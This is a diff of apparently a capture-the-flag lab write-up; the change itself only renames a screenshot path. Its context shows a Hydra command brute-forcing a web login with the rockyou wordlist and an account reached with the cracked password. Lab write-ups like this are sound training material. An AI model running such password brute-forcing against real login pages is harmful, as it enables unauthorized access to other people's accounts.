@@ -73,7 +73,7 @@ hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt 10.112.182.177 \
   http-post-form "/:email=^USER^&password=^PASS^:F=Invalid credentials"
 ```
 
-![](Screenshots/Hydra_help_support_thm_user.png)
+![](Screenshots/Hydra_help@support.thm_user.png)
 
 Hydra reported one valid password for `help@support.thm` (masked above). Logging in with it landed me on the Support Dashboard as **"Helpdesk User"** — a low-privileged account showing only a "Ticket management system" card, with no admin functionality visible.
 
